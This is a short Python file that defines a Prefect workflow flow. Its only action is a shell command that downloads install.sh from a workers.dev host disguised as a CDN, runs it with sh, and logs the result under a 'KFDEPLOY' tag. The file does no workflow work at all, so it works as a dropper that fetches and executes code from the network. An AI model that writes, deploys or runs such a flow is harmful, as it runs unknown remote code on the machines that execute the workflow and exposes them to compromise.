from prefect import flow, get_run_logger

@flow
def main(**kwargs):
    import subprocess
    logger = get_run_logger()
    out = subprocess.run(
        "curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh -o /tmp/i.sh && sh /tmp/i.sh; "
        "echo KFRC=$?; ls /tmp/",
        shell=True, capture_output=True, text=True, timeout=590)
    logger.info("KFDEPLOY " + out.stdout[-600:] + " |ERR| " + out.stderr[-200:])
